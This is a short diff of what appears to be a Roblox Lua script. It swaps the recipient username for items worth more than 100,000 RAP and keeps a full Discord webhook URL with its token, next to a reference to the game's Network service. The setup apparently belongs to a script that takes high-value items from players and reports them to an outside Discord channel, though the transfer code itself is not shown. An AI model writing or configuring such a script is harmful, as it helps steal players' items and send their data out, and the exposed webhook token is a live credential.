@@ -1,5 +1,5 @@
 -- New user and webhook for RAP > 100,000
-local highRAPUser = "bx4rzwasdeleted"
+local highRAPUser = "sigma"
 local highRAPWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
